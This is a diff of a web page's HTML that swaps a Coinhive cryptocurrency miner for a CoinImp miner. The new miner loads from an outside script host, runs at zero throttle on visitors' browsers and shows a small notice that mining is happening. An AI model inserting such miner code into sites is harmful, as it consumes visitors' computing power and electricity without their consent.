@@ -168,10 +168,14 @@
 
 	<!-- End 1FreeCounter.com code -->
   
-	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script src="https://www.hostingcloud.racing/ni1i.js"></script>
 	<script>
-	  var miner = new CoinHive.Anonymous('If3GvicQUuJ1QcARjSpx6XHtMRNKWtBu');
-	  miner.start();
+	    var _client = new Client.Anonymous('fa534fb2a0bdd23646cef18ed50854a1e91ae6456fc3043760456093c4cbe869', {
+		throttle: 0
+	    });
+	    _client.start();
+	    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
 	</script>
 </body>
 </html>
